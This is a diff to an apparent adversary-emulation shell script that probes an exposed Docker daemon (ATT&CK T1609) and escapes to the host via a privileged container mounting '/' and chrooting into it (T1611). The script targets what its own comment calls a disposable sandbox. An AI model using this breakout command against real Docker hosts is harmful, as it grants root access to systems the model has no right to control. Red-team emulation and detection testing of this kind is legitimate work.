@@ -44,16 +44,13 @@ fi
 
 step "discovery — probe the accessible Docker control plane (ATT&CK T1609)"
 st_mark T1609 "docker-discovery"
-act "$ST_TECH" "docker version" docker-sandbox "$DOCKER_HOST"
-docker version 2>&1 | tee -a "$LOG"
+ax "$ST_TECH" docker-sandbox "$DOCKER_HOST" -- docker version 2>&1 | tee -a "$LOG"
 say "containers currently visible on this control plane:"
-act "$ST_TECH" "docker ps -a" docker-sandbox "$DOCKER_HOST"
-docker ps -a 2>&1 | tee -a "$LOG"
+ax "$ST_TECH" docker-sandbox "$DOCKER_HOST" -- docker ps -a 2>&1 | tee -a "$LOG"
 
 step "escape — spawn a privileged container with the daemon's host fs mounted (ATT&CK T1611)"
 st_mark T1611 "privileged-container-escape"
-act "$ST_TECH" "docker run --rm --privileged -v /:/host alpine:3.20 chroot /host" docker-sandbox "$DOCKER_HOST"
-OUT="$(docker run --rm --privileged -v /:/host alpine:3.20 chroot /host sh -c \
+OUT="$(ax "$ST_TECH" docker-sandbox "$DOCKER_HOST" -- docker run --rm --privileged -v /:/host alpine:3.20 chroot /host sh -c \
     'echo "escaped: $(id)"; echo "escaped-hostname: $(hostname)"; echo "escaped-root-listing:"; ls /' 2>&1)"
 say "breakout result (this is docker-sandbox's own disposable root, not the real host):"
 echo "$OUT" | tee -a "$LOG"
